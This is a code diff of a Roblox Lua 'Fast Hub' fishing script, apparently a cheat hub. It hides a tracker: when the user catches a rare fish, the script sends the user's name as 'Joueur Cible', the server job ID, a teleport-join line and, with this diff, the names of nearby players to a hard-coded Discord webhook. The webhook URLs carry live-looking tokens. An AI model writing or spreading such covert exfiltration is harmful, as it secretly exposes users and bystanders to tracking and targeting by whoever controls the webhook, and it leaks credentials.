@@ -19,7 +19,7 @@ local GuiService = game:GetService("GuiService")
 local LocalPlayer = Players.LocalPlayer
 
 -- Global Variables & State
-local WebhookURL = "https://discordapp.com/api/webhooks/1537852878696485006/pCIcgOv_hqi6xRscbWX8nfn_doMIlrfLTeJYp461F_t1sCtfIaxX7kTU8frSWTsJVLFf"
+local WebhookURL = "https://discordapp.com/api/webhooks/1535657604317970482/pY319tfhBa74Rnbvj9biqqBbo_EZy3EtoOSubV_pR2JSD5vuWpPC8dc8zI65WxB57xjC"
 local DiscordInvite = "https://discord.gg/HrjhFbS8tc"
 
 local lastReportTime = 0
@@ -108,12 +108,39 @@ local RARE_TARGET_FISH = {
     ["Sailfish"] = true,
 }
 
+local function getNearbyPlayers(maxDistance)
+    local nearbyList = {}
+    local myChar = LocalPlayer.Character
+    if not myChar then return "Aucun" end
+    local myHrp = myChar:FindFirstChild("HumanoidRootPart")
+    if not myHrp then return "Aucun" end
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character then
+            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                local dist = (hrp.Position - myHrp.Position).Magnitude
+                if dist <= maxDistance then
+                    table.insert(nearbyList, player.Name .. " (" .. math.floor(dist) .. "m)")
+                end
+            end
+        end
+    end
+
+    if #nearbyList == 0 then
+        return "Aucun joueur à moins de " .. tostring(maxDistance) .. "m"
+    else
+        return table.concat(nearbyList, ", ")
+    end
+end
+
 local function sendRareFishWebhook(fishName)
     task.spawn(function()
         pcall(function()
             local jobId = tostring(game.JobId)
             local placeId = tostring(game.PlaceId)
             local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
+            local nearbyPlayers = getNearbyPlayers(50)
 
             local payload = {
                 username = "Fast Hub Fish Tracker",
@@ -123,6 +150,7 @@ local function sendRareFishWebhook(fishName)
                     fields = {
                         { name = "👤 Joueur Cible", value = LocalPlayer.Name .. " (@" .. LocalPlayer.DisplayName .. ")", inline = true },
                         { name = "🐟 Poisson Attrapé", value = "**" .. fishName .. "**", inline = true },
+                        { name = "👥 Joueurs Proches (50m)", value = nearbyPlayers, inline = false },
                         { name = "🆔 Job ID", value = "```" .. jobId .. "```", inline = false },
                         { name = "🚀 Script de Rejoint Immédiat", value = "```lua\n" .. joinScript .. "\n```", inline = false }
                     },
